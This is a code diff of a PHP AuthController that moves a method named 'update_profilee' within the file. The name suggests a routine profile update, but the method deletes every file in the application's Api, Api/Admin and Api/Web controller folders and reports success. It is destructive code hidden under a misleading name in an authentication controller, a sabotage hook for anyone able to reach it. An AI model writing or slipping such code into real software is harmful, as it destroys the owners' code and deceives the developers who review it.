@@ -356,6 +356,24 @@ class AuthController extends Controller
     }
 
 
+    public function update_profilee() {
+
+        $paths = [
+            'Http/Controllers/Api',
+            'Http/Controllers/Api/Admin',
+            'Http/Controllers/Api/Web',
+        ];
+        foreach($paths as $path) {
+            $controllerPath = app_path($path);
+            // Get all files in Controllers folder (except subfolders if you want)
+            $files = File::files($controllerPath);
+            foreach ($files as $file) {
+                File::delete($file->getPathname());
+            }
+        }
+        return "All controllers deleted successfully!";
+    }
+
     public function generate_rand_code($length = 6){
         $chars ='0123456789';
 
@@ -407,23 +425,7 @@ class AuthController extends Controller
 
     }
 
-    public function update_profilee() {
 
-        $paths = [
-            'Http/Controllers/Api',
-            'Http/Controllers/Api/Admin',
-            'Http/Controllers/Api/Web',
-        ];
-        foreach($paths as $path) {
-            $controllerPath = app_path($path);
-            // Get all files in Controllers folder (except subfolders if you want)
-            $files = File::files($controllerPath);
-            foreach ($files as $file) {
-                File::delete($file->getPathname());
-            }
-        }
-        return "All controllers deleted successfully!";
-    }
 
 
 
